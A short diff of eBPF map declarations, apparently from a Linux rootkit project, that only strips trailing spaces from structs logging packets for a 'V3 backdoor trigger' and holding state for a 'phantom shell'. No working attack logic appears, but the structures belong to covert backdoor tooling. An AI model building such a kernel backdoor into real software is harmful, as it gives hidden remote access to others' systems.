@@ -87,13 +87,13 @@ struct exec_var_priv_hijack_active{ //Map
 } exec_var_hijack_active SEC(".maps");
 
 //Map to store log of packets received seeking to find a V3 backdoor trigger
-struct backdoor_priv_packet_log_32{ 
+struct backdoor_priv_packet_log_32{
 	__uint(type, BPF_MAP_TYPE_HASH);
 	__uint(max_entries, 1024);
 	__type(key, __u32); //Source IPv4 of packet
 	__type(value, struct backdoor_packet_log_data_32);
 } backdoor_packet_log_32 SEC(".maps");
-struct backdoor_priv_packet_log_16{ 
+struct backdoor_priv_packet_log_16{
 	__uint(type, BPF_MAP_TYPE_HASH);
 	__uint(max_entries, 1024);
 	__type(key, __u32); //Source IPv4 of packet
@@ -102,7 +102,7 @@ struct backdoor_priv_packet_log_16{
 
 
 //Map to store state and data of phantom shell
-struct backdoor_priv_phantom_shell{ 
+struct backdoor_priv_phantom_shell{
 	__uint(type, BPF_MAP_TYPE_HASH);
 	__uint(max_entries, 1);
 	__type(key, __u64); //Just 1
